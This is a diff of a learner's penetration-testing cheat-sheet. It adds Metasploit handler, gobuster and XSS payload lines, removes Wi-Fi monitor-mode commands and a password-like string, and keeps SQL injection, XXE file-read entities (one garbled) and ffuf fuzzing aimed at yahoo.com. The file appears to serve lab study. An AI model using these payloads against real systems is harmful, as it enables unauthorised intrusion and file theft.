@@ -1,23 +1,17 @@
-airmon-ng
-[call airmon-ng wireless interface]
+use exploit/multi/handler
+[listen to port connection...set LHOST and LPORT]
 
-airmon-ng check kill
-[kill wifi network]
-
-service network-manager start
-[start network back]
-
-airmon-ng start (network name)
-[to turn to monitor mode}
-
-airmon-ng stop()
-[stop mon mode]
+gobuster dir --url http://10.129.53.230 --wordlist directory-list-2.3-small.txt
+[directory bruteforce]
 
 sublist3r -d (sitename.com)
 [search for sub domain]
 
 ffuf -w /root/Downloads/subdomains-wordlist.txt -u https://www.yahoo.com/FUZZ
 [bruteforcing extensions on a site]
+
+cd /opt/pycharm..../bin
+[open pycharm] 
 
 ffuf -w /root/Downloads/subdomains-wordlist.txt -u https://www.yahoo.com/FUZZ -fl (line/ number0
 [filter out extensions with one line or entery]
@@ -37,8 +31,6 @@ robot.txt
 tar -xvzf juice-shop-9.3.1_node12_linux_x64.tgz 
 [unpack OWASP]
 
-RWdm3'!=!!B:6c287Xy)-km~#!&k{&-a
-[port s]
 
 UNION SELECT NULL,NULL,NULL--
 [SQL COLUMN]
@@ -72,3 +64,11 @@ sudo openvpn nmap -sV {target IP}
 <!ENTITY xxe SYSTEM "file:////etc/passwd" >]> {add (&xxe;) to product id column to call XML Injection}
 <!ENTITY xxe SYSTEM "fiphp://filter/convert.base64-encode/resource=/var/www/html/db.php" >]>
 [pull up database request] 
+
+<script>alert(1)</script>
+"><svg onload=alert(1)/>
+[both requires "" and ''] [onerror is for img or anything with src/ onclick is for button]
+
+</whatever tag><whatever tag>alert(1)</whatever tag>
+[backlash and closing tag escape]
+
